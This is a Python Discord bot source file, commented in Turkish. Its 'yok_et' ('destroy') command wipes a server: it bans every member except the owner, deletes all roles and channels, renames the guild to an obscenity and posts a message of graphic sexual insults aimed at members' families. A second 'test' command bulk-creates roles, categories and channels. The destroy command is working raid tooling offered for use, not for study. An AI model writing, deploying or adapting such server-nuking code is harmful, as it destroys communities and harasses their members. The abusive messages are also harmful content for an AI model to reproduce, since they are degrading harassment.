import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot hazır: {bot.user}")

@bot.command()
async def yok_et(ctx):
    """Sunucuyu saniyeler içinde yok eder"""
    guild = ctx.guild
    
    try:
        await guild.edit(name="orospu çocukları siktim laaan")
    except:
        pass
    
    tasks = []
    
    for member in guild.members:
        if member != guild.owner and member != bot.user:
            tasks.append(member.ban(reason="Sunucu temizliği"))
    
    for role in guild.roles:
        if role != guild.default_role:
            tasks.append(role.delete())
    
    for channel in guild.channels:
        tasks.append(channel.delete())
    
    await asyncio.gather(*tasks, return_exceptions=True)
    
    new_channel = await guild.create_text_channel("tarafından-sıkıldı-hadi-yallah")
    
    await new_channel.send(
        "**LemonSe Bot** tarafından sıkıldı hadi yallah!\n\n"
        "Ana bacı sövüyorum:\n"
        "- Ananızın amına koyayım sizin! Orospu çocukları!\n"
        "- Sizin gibi yarrağı yemiş herifleri banlamak ne güzel!\n"
        "- Ananızı sikeyim, babanızı sikeyim, sülalenizin hepsini sikeyim!\n"
        "- Ne biçim sunucu lan bu? Amına koyduğumun yerinde herkes banlandı!\n"
        "- Siz ne sandınız? LemonSe Bot gelir sizi temizler, anasını siktiğimin sunucusunu dümdüz eder!\n"
        "- Hadi yallah orospu çocukları, Discord'dan silin gidin!\n"
        "- Sonra da gelip ağlamayın, ananızı sikeyim sizin! 😘"
    )

@bot.command()
async def test(ctx):
    """Test ortamı oluşturur: 30 kanal, 50 kategori, 100 rol"""
    guild = ctx.guild
    tasks = []
    
    # 100 rol oluştur
    for i in range(1, 101):
        role_name = f"Test Rol {i}"
        tasks.append(guild.create_role(name=role_name, reason="Test amacıyla oluşturuldu"))
    
    # 50 kategori oluştur
    for i in range(1, 51):
        category_name = f"Test Kategori {i}"
        tasks.append(guild.create_category(name=category_name, reason="Test amacıyla oluşturuldu"))
    
    # 30 metin kanalı oluştur (kategorilere eklemeden, genel kanal olarak)
    for i in range(1, 31):
        channel_name = f"test-kanal-{i}"
        tasks.append(guild.create_text_channel(name=channel_name, reason="Test amacıyla oluşturuldu"))
    
    # Tüm işlemleri paralel çalıştır
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    # Kaç başarılı olduğunu hesapla
    success_count = sum(1 for r in results if not isinstance(r, Exception))
    
    await ctx.send(f"✅ Test ortamı oluşturuldu! {success_count} nesne başarıyla eklendi. (30 kanal, 50 kategori, 100 rol hedeflenmişti)")

bot.run(os.getenv("DISCORD_TOKEN"))
